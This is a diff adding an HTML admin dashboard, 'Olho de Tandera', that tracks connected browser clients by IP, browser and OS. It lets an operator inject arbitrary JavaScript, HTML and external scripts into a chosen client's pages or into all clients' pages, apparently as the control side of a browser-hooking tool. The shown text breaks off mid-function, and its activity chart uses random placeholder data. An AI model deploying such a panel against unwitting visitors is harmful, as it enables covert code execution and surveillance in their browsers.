@@ -1,0 +1,1483 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Painel de Administração - Olho de Tandera</title>
+    <!-- Google Fonts -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&family=Roboto+Mono:wght@400;500&display=swap" rel="stylesheet">
+    <!-- Bootstrap 5.3.6 CSS -->
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.6/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-4Q6Gf2aSP4eDXB8Miphtr37CMZZQ5oXLH2yaXMJ2w8e2ZtHTl7GptT4jmndRuHDT" crossorigin="anonymous">
+    <!-- Font Awesome CDN -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" integrity="sha512-Avb2QiuDEEvB4bZJYdft2mNjVShBftLdPG8FJ0V7irTLQ8Uo0qcPxh4Plq7G5tGm0rU+1SPhVotteLpBERwTkw==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+    <!-- CSS customizado -->
+    <link rel="stylesheet" href="/static/css/olho-tandera.css">
+    
+    <!-- Bootstrap JS Bundle com Popper -->
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.6/dist/js/bootstrap.bundle.min.js" integrity="sha384-j1CDi7MgGQ12Z7Qab0qlWQ/Qqz24Gc6BM0thvEMVjHnfYGF0rmFCozFSxQBxwHKO" crossorigin="anonymous"></script>
+    
+    <!-- Popper.js e Bootstrap JS separados -->
+    <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.11.8/dist/umd/popper.min.js" integrity="sha384-I7E8VVD/ismYTF4hNIPjVp/Zjvgyol6VFvRkX/vR+Vc4jQkC+hVqc2pM8ODewa9r" crossorigin="anonymous"></script>
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.6/dist/js/bootstrap.min.js" integrity="sha384-RuyvpeZCxMJCqVUGFI0Do1mQrods/hhxYlcVfGPOfQtPJh0JCw12tUAZ/Mv10S7D" crossorigin="anonymous"></script>
+    
+    <!-- Socket.IO client -->
+    <script src="/static/js/socket.io.min.js"></script>
+    <!-- Parser de User Agent -->
+    <script src="/static/js/user-agent-parser.js"></script>
+    <!-- Ícones de navegador e sistema operacional -->
+    <script src="/static/js/browser-os-icons.js"></script>
+</head>
+<body>
+    <!-- Sidebar -->
+    <div class="sidebar" id="sidebar">
+        <div class="sidebar-header">
+            <div class="sidebar-brand">
+                <div class="brand-icon" title="Clique para expandir">
+                    <i class="fas fa-eye"></i>
+                </div>
+                <div class="brand-text">
+                    <h1 id="sidebar-title">Olho de Tandera</h1>
+                    <span class="brand-subtitle">Sistema de Monitoramento</span>
+                </div>
+            </div>
+            <button class="sidebar-toggle" id="sidebar-toggle">
+                <i class="fas fa-bars"></i>
+            </button>
+        </div>
+        <div class="sidebar-menu">
+            <a href="#dashboard" class="menu-item active" data-page="dashboard">
+                <i class="fas fa-tachometer-alt"></i>
+                <span class="menu-text">Dashboard</span>
+            </a>
+            <a href="#commands" class="menu-item" data-page="commands">
+                <i class="fas fa-terminal"></i>
+                <span class="menu-text">Comandos</span>
+            </a>
+            <a href="#clients" class="menu-item" data-page="clients">
+                <i class="fas fa-users"></i>
+                <span class="menu-text">Clientes</span>
+            </a>
+            <a href="#logs" class="menu-item" data-page="logs">
+                <i class="fas fa-history"></i>
+                <span class="menu-text">Logs</span>
+            </a>
+            <div class="mt-4 border-top pt-4">
+                <a href="/logout" class="menu-item">
+                    <i class="fas fa-sign-out-alt"></i>
+                    <span class="menu-text">Logout</span>
+                </a>
+            </div>
+        </div>
+    </div>
+
+    <!-- Header -->
+    <div class="main-header" id="header">
+        <div class="header-actions ms-auto">
+            <div class="header-icon">
+                <i class="fas fa-bell"></i>
+                <span class="badge-notification" id="notification-count">0</span>
+            </div>
+            <div class="user-profile">
+                <div class="user-avatar">A</div>
+                <div class="user-info d-none d-md-block">
+                    <p class="user-name">Admin</p>
+                    <p class="user-role">Administrador</p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Main Content -->
+    <div class="main-content" id="main-content">
+        <!-- Dashboard Section -->
+        <div class="content-page active" id="dashboard-page">
+            <div class="d-flex justify-content-between align-items-center mb-4">
+                <h1 class="mb-0">Dashboard</h1>
+                <button class="btn btn-outline-dark" onclick="refreshDashboard()">
+                    <i class="fas fa-sync-alt"></i> Atualizar
+                </button>
+            </div>
+
+            <!-- Stats Row -->
+            <div class="row">
+                <!-- Total Clientes -->
+                <div class="col-xl-3 col-md-6 mb-4">
+                    <div class="card">
+                        <div class="stats-card">
+                            <div class="stats-icon primary">
+                                <i class="fas fa-users"></i>
+                            </div>
+                            <div class="stats-info">
+                                <h3 id="total-clients">0</h3>
+                                <span>Total de Clientes</span>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                
+                <!-- Clientes Online -->
+                <div class="col-xl-3 col-md-6 mb-4">
+                    <div class="card">
+                        <div class="stats-card">
+                            <div class="stats-icon success">
+                                <i class="fas fa-plug"></i>
+                            </div>
+                            <div class="stats-info">
+                                <h3 id="online-clients">0</h3>
+                                <span>Clientes Online</span>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                
+                <!-- Clientes WebSocket -->
+                <div class="col-xl-3 col-md-6 mb-4">
+                    <div class="card">
+                        <div class="stats-card">
+                            <div class="stats-icon warning">
+                                <i class="fas fa-bolt"></i>
+                            </div>
+                            <div class="stats-info">
+                                <h3 id="websocket-clients">0</h3>
+                                <span>Clientes WebSocket</span>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                
+                <!-- Comandos Enviados -->
+                <div class="col-xl-3 col-md-6 mb-4">
+                    <div class="card">
+                        <div class="stats-card">
+                            <div class="stats-icon danger">
+                                <i class="fas fa-terminal"></i>
+                            </div>
+                            <div class="stats-info">
+                                <h3 id="total-commands">0</h3>
+                                <span>Comandos Enviados</span>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Charts Row -->
+            <div class="row">
+                <!-- Connection Types Chart -->
+                <div class="col-xl-6 mb-4">
+                    <div class="card">
+                        <div class="card-header">
+                            Tipos de Conexão
+                        </div>
+                        <div class="card-body chart-container">
+                            <canvas id="connectionChart"></canvas>
+                        </div>
+                    </div>
+                </div>
+                
+                <!-- Client Activity Chart -->
+                <div class="col-xl-6 mb-4">
+                    <div class="card">
+                        <div class="card-header">
+                            Atividade de Clientes (últimas 24h)
+                        </div>
+                        <div class="card-body chart-container">
+                            <canvas id="activityChart"></canvas>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Clients Table -->
+            <div class="card">
+                <div class="card-header d-flex justify-content-between align-items-center">
+                    <span>Clientes Conectados</span>
+                    <a href="#clients" class="btn btn-sm btn-outline-light" data-page="clients" onclick="refreshClientsTables(); return false;">
+                        Ver todos <i class="fas fa-arrow-right ms-1"></i>
+                    </a>
+                </div>
+                <div class="card-body">
+                    <div class="table-responsive">
+                        <table class="table table-hover table-sortable table-dark" id="dashboard-clients-table">
+                            <thead>
+                                <tr>
+                                    <th>Status</th>
+                                    <th>ID do Cliente</th>
+                                    <th>Última Atividade</th>
+                                    <th>IP</th>
+                                    <th>Browser</th>
+                                    <th>OS</th>
+                                    <th>Conexão</th>
+                                    <th>Ações</th>
+                                </tr>
+                            </thead>
+                            <tbody>
+                                <!-- Preenchido dinamicamente via JavaScript -->
+                            </tbody>
+                        </table>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Commands Section -->
+        <div class="content-page" id="commands-page">
+            <div class="d-flex justify-content-between align-items-center mb-4">
+                <h1 class="mb-0">Comandos</h1>
+                <div id="client-selector" class="d-none">
+                    <div class="alert alert-dark">
+                        <i class="fas fa-user-circle me-2"></i>
+                        Cliente selecionado: <strong id="selected-client-id">Nenhum</strong>
+                        <button class="btn btn-sm btn-outline-light ms-3" id="clear-selection">
+                            <i class="fas fa-times"></i> Limpar
+                        </button>
+                    </div>
+                </div>
+            </div>
+
+            <div class="card mb-4">
+                <div class="card-header">
+                    Painel de Controle
+                </div>
+                <div class="card-body">
+                    <div class="form-group mb-4">
+                        <label for="target-client" class="form-label">Cliente alvo:</label>
+                        <select id="target-client" class="form-select">
+                            <option value="default">Todos os clientes</option>
+                            <!-- Os clientes serão carregados dinamicamente -->
+                        </select>
+                    </div>
+
+                    <!-- Seção de Informações do Cliente -->
+                    <div id="client-info-section" class="mb-4 d-none">
+                        <div class="card border-accent card-green">
+                            <div class="card-header  d-flex align-items-center">
+                                <i class="fas fa-info-circle me-2 text-accent"></i>
+                                <span>Informações do Cliente Selecionado</span>
+                            </div>
+                            <div class="card-body">
+                                <div class="row">
+                                    <div class="col-md-6">
+                                        <p><strong>ID: </strong><code><span id="info-client-id">-</span></code></p>
+                                        <p><strong>Status:</strong> <span id="info-client-status">-</span></p>
+                                        <p><strong>IP:</strong> <code><span id="info-client-ip">-</span></code></p>
+                                        <p><strong>Browser:</strong> <span id="info-client-browser">-</span></p>
+                                    </div>
+                                    <div class="col-md-6">
+                                        <p><strong>Última Atividade:</strong> <span id="info-client-last-activity">-</span></p>
+                                        <p><strong>Tipo de Conexão:</strong> <span id="info-client-connection">-</span></p>
+                                        <p><strong>Sistema Operacional:</strong> <span id="info-client-os">-</span></p>
+                                        <p class="small text-muted"><a href="#" id="show-user-agent" onclick="toggleUserAgent(); return false;">Ver User-Agent completo</a></p>
+                                    </div>
+                                </div>
+                                <div id="user-agent-details" class="mt-2 d-none">
+                                    <div class="alert alert-secondary">
+                                        <small id="info-client-agent" class="user-agent-full">-</small>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Command Tabs -->
+                    <ul class="nav nav-tabs" id="commandTabs" role="tablist">
+                        <li class="nav-item" role="presentation">
+                            <button class="nav-link active" id="js-tab" data-bs-toggle="tab" 
+                                data-bs-target="#js-panel" type="button" role="tab" aria-controls="js-panel" 
+                                aria-selected="true">JavaScript</button>
+                        </li>
+                        <li class="nav-item" role="presentation">
+                            <button class="nav-link" id="html-tab" data-bs-toggle="tab" 
+                                data-bs-target="#html-panel" type="button" role="tab" aria-controls="html-panel" 
+                                aria-selected="false">HTML</button>
+                        </li>
+                        <li class="nav-item" role="presentation">
+                            <button class="nav-link" id="manipulate-tab" data-bs-toggle="tab" 
+                                data-bs-target="#manipulate-panel" type="button" role="tab" 
+                                aria-controls="manipulate-panel" aria-selected="false">Manipular Elemento</button>
+                        </li>
+                        <li class="nav-item" role="presentation">
+                            <button class="nav-link" id="visibility-tab" data-bs-toggle="tab" 
+                                data-bs-target="#visibility-panel" type="button" role="tab" 
+                                aria-controls="visibility-panel" aria-selected="false">Visibilidade</button>
+                        </li>
+                        <li class="nav-item" role="presentation">
+                            <button class="nav-link" id="head-tab" data-bs-toggle="tab" 
+                                data-bs-target="#head-panel" type="button" role="tab" 
+                                aria-controls="head-panel" aria-selected="false">Head</button>
+                        </li>
+                    </ul>
+
+                    <!-- Tab Content -->
+                    <div class="tab-content" id="commandTabContent">
+                        <!-- JavaScript Tab -->
+                        <div class="tab-pane fade show active" id="js-panel" role="tabpanel" aria-labelledby="js-tab">
+                            <div class="form-group">
+                                <label for="js-command" class="form-label">Inject JavaScript:</label>
+                                <textarea id="js-command" class="form-control code-editor" placeholder="Digite o código JavaScript aqui..."></textarea>
+                                <div class="d-flex justify-content-end mt-3">
+                                    <button onclick="previewCommand('js')" class="btn btn-outline-dark me-2">
+                                        <i class="fas fa-eye"></i> Preview
+                                    </button>
+                                    <button onclick="sendCommand('js')" class="btn btn-accent">
+                                        <i class="fas fa-play"></i> Executar JS
+                                    </button>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- HTML Tab -->
+                        <div class="tab-pane fade" id="html-panel" role="tabpanel" aria-labelledby="html-tab">
+                            <div class="form-group">
+                                <label for="html-content" class="form-label">Inject HTML:</label>
+                                <textarea id="html-content" class="form-control code-editor" placeholder="Digite o HTML a ser injetado..."></textarea>
+                                <div class="d-flex justify-content-end mt-3">
+                                    <button onclick="previewCommand('html')" class="btn btn-outline-dark me-2">
+                                        <i class="fas fa-eye"></i> Preview
+                                    </button>
+                                    <button onclick="sendCommand('html')" class="btn btn-accent">
+                                        <i class="fas fa-code"></i> Inject HTML
+                                    </button>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- Manipulate Element Tab -->
+                        <div class="tab-pane fade" id="manipulate-panel" role="tabpanel" aria-labelledby="manipulate-tab">
+                            <div class="row">
+                                <div class="col-md-6 mb-3">
+                                    <label for="target-element" class="form-label">ID do Elemento:</label>
+                                    <input type="text" id="target-element" class="form-control" placeholder="ID do Elemento">
+                                </div>
+                                <div class="col-md-6 mb-3">
+                                    <label for="action-type" class="form-label">Tipo de Ação:</label>
+                                    <select id="action-type" class="form-select">
+                                        <option value="ADD">Adicionar</option>
+                                        <option value="REPLACE">Substituir</option>
+                                        <option value="INSERT_AFTER">Inserir Abaixo</option>
+                                        <option value="INSERT_BEFORE">Inserir Acima</option>
+                                    </select>
+                                </div>
+                            </div>
+                            <div class="form-group mb-3">
+                                <label for="manipulation-content" class="form-label">Conteúdo:</label>
+                                <textarea id="manipulation-content" class="form-control code-editor" placeholder="Conteúdo a ser manipulado..."></textarea>
+                            </div>
+                            <div class="d-flex justify-content-end">
+                                <button onclick="previewCommand('manipulate')" class="btn btn-outline-dark me-2">
+                                    <i class="fas fa-eye"></i> Preview
+                                </button>
+                                <button onclick="sendCommand('manipulate')" class="btn btn-accent">
+                                    <i class="fas fa-edit"></i> Aplicar Manipulação
+                                </button>
+                            </div>
+                        </div>
+
+                        <!-- Visibility Tab -->
+                        <div class="tab-pane fade" id="visibility-panel" role="tabpanel" aria-labelledby="visibility-tab">
+                            <div class="form-group mb-3">
+                                <label for="visibility-element" class="form-label">ID do Elemento:</label>
+                                <input type="text" id="visibility-element" class="form-control" placeholder="ID do Elemento">
+                            </div>
+                            <div class="form-check mb-3">
+                                <input type="radio" name="visibility" id="show" value="show" class="form-check-input" checked>
+                                <label class="form-check-label" for="show">Mostrar</label>
+                            </div>
+                            <div class="form-check mb-3">
+                                <input type="radio" name="visibility" id="hide" value="hide" class="form-check-input">
+                                <label class="form-check-label" for="hide">Ocultar</label>
+                            </div>
+                            <div class="d-flex justify-content-end">
+                                <button onclick="sendCommand('visibility')" class="btn btn-accent">
+                                    <i class="fas fa-eye-slash"></i> Aplicar Visibilidade
+                                </button>
+                            </div>
+                        </div>
+
+                        <!-- Head Tab -->
+                        <div class="tab-pane fade" id="head-panel" role="tabpanel" aria-labelledby="head-tab">
+                            <div class="form-group mb-3">
+                                <label for="head-action" class="form-label">Tipo de Ação:</label>
+                                <select id="head-action" class="form-select">
+                                    <option value="CSS_URL">Adicionar CSS externo (URL)</option>
+                                    <option value="CSS_INLINE">Adicionar CSS inline</option>
+                                    <option value="JS_URL">Adicionar Script externo (URL)</option>
+                                    <option value="JS_INLINE">Adicionar Script inline</option>
+                                    <option value="META">Adicionar Meta tag</option>
+                                </select>
+                            </div>
+                            <div class="form-group mb-3">
+                                <label for="head-content" class="form-label">Conteúdo:</label>
+                                <textarea id="head-content" class="form-control code-editor" placeholder="URL ou conteúdo inline..."></textarea>
+                            </div>
+                            <div class="d-flex justify-content-end">
+                                <button onclick="previewCommand('head')" class="btn btn-outline-dark me-2">
+                                    <i class="fas fa-eye"></i> Preview
+                                </button>
+                                <button onclick="sendCommand('head')" class="btn btn-accent">
+                                    <i class="fas fa-heading"></i> Adicionar ao Head
+                                </button>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Preview Panel -->
+                    <div id="preview-panel" class="mt-4">
+                        <h4><i class="fas fa-eye me-2"></i>Preview</h4>
+                        <div id="preview-content" class="preview-container"></div>
+                    </div>
+                    
+                    <!-- Status -->
+                    <div id="status" class="mt-4">Pronto para enviar comandos</div>
+                </div>
+            </div>
+        </div>
+
+        
+        <!-- Logs Section -->
+        <div class="content-page" id="logs-page">
+            <div class="d-flex justify-content-between align-items-center mb-4">
+                <h1 class="mb-0">Logs</h1>
+                <button class="btn btn-outline-dark" onclick="refreshLogs()">
+                    <i class="fas fa-sync-alt"></i> Atualizar
+                </button>
+            </div>
+            
+            <!-- Logs Console -->
+            <div class="console-container">
+                <div class="console-header">
+                    <h2 class="console-title"><i class="fas fa-history"></i> Histórico de Comandos</h2>
+                    <div>
+                        <button class="console-button" onclick="toggleFullscreen()" title="Tela cheia">
+                            <i class="fas fa-expand"></i>
+                        </button>
+                    </div>
+                </div>
+                
+                <!-- Console Content -->
+                <div class="console-body">
+                    <div id="logs-list">
+                        <p class="text-center p-4">
+                            <i class="fas fa-circle-notch fa-spin me-2"></i> Carregando logs...
+                        </p>
+                    </div>
+                </div>
+            </div>
+            
+            <!-- Clientes Alvo -->
+            <div class="card mt-4 console-target-card">
+                <div class="card-header d-flex justify-content-between align-items-center">
+                    <span><i class="fas fa-users me-2"></i> Cliente Alvo para Execução de Comandos</span>
+                    <div>
+                        <select id="console-target-client" class="form-select form-select-sm d-inline-block me-2" style="width: 250px;">
+                            <option value="default">Todos os clientes</option>
+                            <!-- Opções carregadas dinamicamente -->
+                        </select>
+                        <button class="console-button" onclick="refreshClientsForConsole()" title="Atualizar lista de clientes">
+                            <i class="fas fa-sync-alt"></i>
+                        </button>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- jQuery -->
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+    <!-- Bootstrap 5.3.6 Bundle JS (inclui Popper.js) -->
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.6/dist/js/bootstrap.bundle.min.js" integrity="sha384-j1CDi7MgGQ12Z7Qab0qlWQ/Qqz24Gc6BM0thvEMVjHnfYGF0rmFCozFSxQBxwHKO" crossorigin="anonymous"></script>
+    <!-- Chart JS via CDN -->
+    <script src="https://cdn.jsdelivr.net/npm/chart.js@3.9.1/dist/chart.min.js"></script>
+    <!-- Table Interactions JS -->
+    <script src="/static/js/table-interactions.js"></script>
+    <!-- Table Pagination JS -->
+    <script src="/static/js/table-pagination.js"></script>
+    <!-- Console Terminal JS -->
+    <script src="/static/js/console-terminal.js"></script>
+    <!-- Correções consolidadas para tabelas -->
+    <script src="/static/js/table-fixes-consolidated.js"></script>
+    <!-- Parser de User-Agent -->
+    
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const sidebar = document.getElementById('sidebar');
+            const header = document.getElementById('header');
+            const mainContent = document.getElementById('main-content');
+            const sidebarToggle = document.getElementById('sidebar-toggle');
+            const sidebarTitle = document.getElementById('sidebar-title');
+            
+            // Função para alternar a barra lateral
+            function toggleSidebar() {
+                sidebar.classList.toggle('sidebar-collapsed');
+                header.classList.toggle('header-collapsed');
+                mainContent.classList.toggle('content-collapsed');
+            }
+            
+            // Toggle sidebar ao clicar no botão
+            sidebarToggle.addEventListener('click', toggleSidebar);
+            
+            // Toggle sidebar ao clicar no brand quando estiver colapsado
+            const sidebarBrand = document.querySelector('.sidebar-brand');
+            sidebarBrand.addEventListener('click', function(e) {
+                // Só ativa quando o sidebar está colapsado e não é um clique no botão toggle
+                if (sidebar.classList.contains('sidebar-collapsed') && 
+                    !e.target.closest('.sidebar-toggle')) {
+                    toggleSidebar();
+                }
+            });
+            
+            // Page navigation
+            const menuItems = document.querySelectorAll('.menu-item');
+            const contentPages = document.querySelectorAll('.content-page');
+            
+            menuItems.forEach(item => {
+                item.addEventListener('click', function(e) {
+                    const targetPage = this.getAttribute('data-page');
+                    if (!targetPage) return;
+                    
+                    e.preventDefault();
+                    
+                    // Update active menu item
+                    menuItems.forEach(i => i.classList.remove('active'));
+                    this.classList.add('active');
+                    
+                    // Show target page
+                    contentPages.forEach(page => {
+                        page.classList.remove('active');
+                    });
+                    document.getElementById(targetPage + '-page').classList.add('active');
+                    
+                    // If mobile, close sidebar
+                    if (window.innerWidth < 992) {
+                        sidebar.classList.remove('sidebar-mobile-open');
+                    }
+                    
+                    // Special handling for specific pages
+                    if (targetPage === 'clients') {
+                        refreshClients();
+                    } else if (targetPage === 'logs') {
+                        refreshLogs();
+                        // Inicializar o seletor de clientes para o console
+                        refreshClientsForConsole();
+                    } else if (targetPage === 'dashboard') {
+                        refreshDashboard();
+                    }
+                });
+            });
+            
+            // Handle buttons that navigate to specific pages
+            document.querySelectorAll('[data-page]').forEach(item => {
+                if (item.classList.contains('menu-item')) return; // Skip menu items, already handled above
+                
+                item.addEventListener('click', function(e) {
+                    const targetPage = this.getAttribute('data-page');
+                    if (!targetPage) return;
+                    
+                    e.preventDefault();
+                    
+                    // Find and click corresponding menu item to handle navigation
+                    const menuItem = document.querySelector(`.menu-item[data-page="${targetPage}"]`);
+                    if (menuItem) menuItem.click();
+                });
+            });
+            
+            // Clear client selection
+            document.getElementById('clear-selection').addEventListener('click', function() {
+                clearClientSelection();
+            });
+            
+            // Initialize
+            refreshDashboard();
+        });
+        
+        // WebSocket Connection for Admin
+        let socket = null;
+        
+        function initWebSocket() {
+            try {
+                // Initialize Socket.IO
+                socket = io();
+                
+                // Connect event
+                socket.on('connect', function() {
+                    console.log('Admin connected via WebSocket');
+                    document.getElementById('notification-count').textContent = '0';
+                    
+                    // Admin joins admin room
+                    socket.emit('join_admin');
+                });
+                
+                // Admin join confirmation
+                socket.on('admin_joined', function(data) {
+                    if (data.success) {
+                        console.log('Admin joined admin room');
+                    } else {
+                        console.error('Error joining admin room:', data.error);
+                    }
+                });
+                
+                // Real-time client updates
+                socket.on('client_update', function(data) {
+                    console.log('Real-time client update:', data);
+                    
+                    // Increment notification counter
+                    const notificationCount = document.getElementById('notification-count');
+                    notificationCount.textContent = parseInt(notificationCount.textContent) + 1;
+                    
+                    // Highlight client with activity if we have the TableUtils available
+                    if (window.TableUtils && data.client_id) {
+                        window.TableUtils.highlightClientActivity(data.client_id);
+                    }
+                    
+                    // Show notification toast with neon effect
+                    showNeonToast(`Cliente ${data.client_id.substring(0, 8)}... atualizado`, 'info');
+                    
+                    // Update clients list if on clients page
+                    if (document.getElementById('clients-page').classList.contains('active')) {
+                        refreshClients();
+                    }
+                    
+                    // Update dashboard if on dashboard page
+                    if (document.getElementById('dashboard-page').classList.contains('active')) {
+                        refreshDashboard();
+                    }
+                });
+                
+                // Disconnect event
+                socket.on('disconnect', function() {
+                    console.log('Admin disconnected from WebSocket');
+                });
+                
+                // Reconnect event
+                socket.on('reconnect', function() {
+                    console.log('Admin reconnected via WebSocket');
+                    socket.emit('join_admin');
+                });
+            } catch (e) {
+                console.error('Error initializing WebSocket:', e);
+            }
+        }
+
+        // Dashboard functions
+        function refreshDashboard() {
+            // Refresh client stats and table
+            fetchClientStats();
+            fetchDashboardClients();
+            
+            // Reset notification counter
+            document.getElementById('notification-count').textContent = '0';
+        }
+        
+        function fetchClientStats() {
+            fetch('/admin/clients')
+                .then(response => response.json())
+                .then(data => {
+                    if (data.clients) {
+                        const totalClients = data.clients.length;
+                        const onlineClients = data.clients.filter(client => client.active).length;
+                        const websocketClients = data.clients.filter(client => client.websocket).length;
+                        
+                        document.getElementById('total-clients').textContent = totalClients;
+                        document.getElementById('online-clients').textContent = onlineClients;
+                        document.getElementById('websocket-clients').textContent = websocketClients;
+                        
+                        // Update connection type chart
+                        updateConnectionChart(websocketClients, onlineClients - websocketClients, totalClients - onlineClients);
+                    }
+                })
+                .catch(error => {
+                    console.error('Error fetching client stats:', error);
+                });
+                
+            // Fetch logs to get command count
+            fetch('/admin/logs')
+                .then(response => response.json())
+                .then(data => {
+                    if (data.logs) {
+                        document.getElementById('total-commands').textContent = data.logs.length;
+                    }
+                })
+                .catch(error => {
+                    console.error('Error fetching logs:', error);
+                });
+        }
+        
+        function fetchDashboardClients() {
+            fetch('/admin/clients')
+                .then(response => response.json())
+                .then(data => {
+                    const tableBody = document.querySelector('#dashboard-clients-table tbody');
+                    
+                    if (data.clients && data.clients.length > 0) {
+                        // Sort clients: online first, then by last activity
+                        data.clients.sort((a, b) => {
+                            if (a.active !== b.active) return a.active ? -1 : 1;
+                            return new Date(b.last_seen) - new Date(a.last_seen);
+                        });
+                        
+                        // Display only top 5 clients
+                        const displayClients = data.clients.slice(0, 5);
+                        
+                        const clientsHtml = displayClients.map(client => `
+                            <tr class="${client.active ? (client.websocket ? 'table-primary' : '') : 'table-secondary'}" 
+                                data-client-id="${client.id}" 
+                                data-client-status="${client.active ? 'online' : 'offline'}"
+                                data-client-connection="${client.websocket ? 'websocket' : 'polling'}">
+                                <td class="status-cell">
+                                    <div class="status-tooltip" title="Última atividade: ${new Date(client.last_seen).toLocaleString()}">
+                                        <span class="client-status ${client.active ? 'status-online' : 'status-offline'}"></span>
+                                        ${client.active ? 'ON' : 'OFF'}
+                                    </div>
+                                </td>
+                                <td>
+                                    <div class="client-id">
+                                        <code>${client.id}</code>
+                                    </div>
+                                </td>
+                                <td>${new Date(client.last_seen).toLocaleString()}</td>
+                                <td>${client.ip || 'N/A'}</td>
+                                <td>
+                                    <div class="browser-cell" title="${client.user_agent || 'N/A'}">
+                                        <i class="fas fa-globe me-1"></i>${parseUserAgent(client.user_agent).browser}
+                                    </div>
+                                </td>
+                                <td>
+                                    <div class="os-cell" title="${client.user_agent || 'N/A'}">
+                                        <i class="fas fa-desktop me-1"></i>${parseUserAgent(client.user_agent).os}
+                                    </div>
+                                </td>
+                                <td>
+                                    ${client.websocket 
+                                        ? '<span class="btn btn-sm badge-websocket"><i class="fas fa-bolt me-1"></i>WebSocket</span>' 
+                                        : '<span class="btn btn-sm badge-polling"><i class="fas fa-sync me-1"></i>Polling</span>'}
+                                </td>
+                                <td>
+                                    <button onclick="targetClient('${client.id}')" class="btn btn-sm btn-danger">
+                                        <i class="fas fa-terminal me-1"></i> Selecionar
+                                    </button>
+                                </td>
+                            </tr>
+                        `).join('');
+                        
+                        tableBody.innerHTML = clientsHtml;
+                    } else {
+                        tableBody.innerHTML = '<tr><td colspan="7" class="text-center">Nenhum cliente encontrado.</td></tr>';
+                    }
+                })
+                .catch(error => {
+                    console.error('Error loading dashboard clients:', error);
+                    document.querySelector('#dashboard-clients-table tbody').innerHTML = 
+                        '<tr><td colspan="7" class="text-center text-danger">Erro ao carregar clientes.</td></tr>';
+                });
+        }
+        
+        // Charts
+        function updateConnectionChart(websocket, polling, offline) {
+            const ctx = document.getElementById('connectionChart');
+            if (!ctx) {
+                console.error("Chart canvas element 'connectionChart' not found");
+                return;
+            }
+            
+            try {
+                // Destroy existing chart if it exists
+                if (window.connectionChart && typeof window.connectionChart.destroy === 'function') {
+                    window.connectionChart.destroy();
+                }
+                
+                // Create new chart
+                window.connectionChart = new Chart(ctx, {
+                    type: 'doughnut',
+                    data: {
+                        labels: ['WebSocket', 'Polling', 'Offline'],
+                        datasets: [{
+                            data: [websocket, polling, offline],
+                            backgroundColor: [
+                                '#ffc107',  // Primary (WebSocket)
+                                '#007bff',  // Warning (Polling)
+                                '#6c757d'   // Secondary (Offline)
+                            ],
+                            borderWidth: 0
+                        }]
+                    },
+                    options: {
+                        responsive: true,
+                        maintainAspectRatio: false,
+                        plugins: {
+                            legend: {
+                                position: 'right',
+                                labels: {
+                                    color: '#e0e0e0'
+                                }
+                            }
+                        }
+                    }
+                });
+                
+                // Create client activity chart
+                updateClientActivityChart();
+            } catch (error) {
+                console.error("Error creating connection chart:", error);
+            }
+        }
+        
+        function updateClientActivityChart() {
+            const ctx = document.getElementById('activityChart');
+            if (!ctx) {
+                console.error("Chart canvas element 'activityChart' not found");
+                return;
+            }
+             try {
+                // Generate sample data - in a real implementation this would come from the server
+                const hours = [...Array(24).keys()].map(i => `${i}h`);
+                const activity = [...Array(24).keys()].map(() => Math.floor(Math.random() * 10));
+                
+                // Destroy existing chart if it exists
+                if (window.activityChart && typeof window.activityChart.destroy === 'function') {
+                    window.activityChart.destroy();
+                }
+                
+                window.activityChart = new Chart(ctx, {
+                type: 'line',
+                data: {
+                    labels: hours,
+                    datasets: [{
+                        label: 'Clientes Ativos',
+                        data: activity,
+                        borderColor: '#00d68f',
+                        backgroundColor: 'rgba(0, 214, 143, 0.1)',
+                        tension: 0.4,
+                        fill: true
+                    }]
+                },
+                options: {
+                    responsive: true,
+                    maintainAspectRatio: false,
+                    scales: {
+                        y: {
+                            beginAtZero: true,
+                            ticks: {
+                                color: '#8a8a8a'
+                            },
+                            grid: {
+                                color: '#2c2c2c'
+                            }
+                        },
+                        x: {
+                            ticks: {
+                                color: '#8a8a8a'
+                            },
+                            grid: {
+                                color: '#2c2c2c'
+                            }
+                        }
+                    },
+                    plugins: {
+                        legend: {
+                            labels: {
+                                color: '#e0e0e0'
+                            }
+                        }
+                    }
+                }
+            });
+            } catch (error) {
+                console.error("Error creating activity chart:", error);
+            }
+        }
+
+        // Command functions
+        function sendCommand(type) {
+            const statusElement = document.getElementById('status');
+            const clientId = document.getElementById('target-client').value;
+            
+            try {
+                let data = { 
+                    type,
+                    client_id: clientId
+                };
+                
+                switch(type) {
+                    case 'js':
+                        data.content = document.getElementById('js-command').value;
+                        if (!data.content.trim()) {
+                            throw new Error("O código JavaScript não pode estar vazio");
+                        }
+                        break;
+                        
+                    case 'html':
+                        data.content = document.getElementById('html-content').value;
+                        if (!data.content.trim()) {
+                            throw new Error("O conteúdo HTML não pode estar vazio");
+                        }
+                        break;
+                        
+                    case 'manipulate':
+                        data.target_id = document.getElementById('target-element').value;
+                        data.action = document.getElementById('action-type').value;
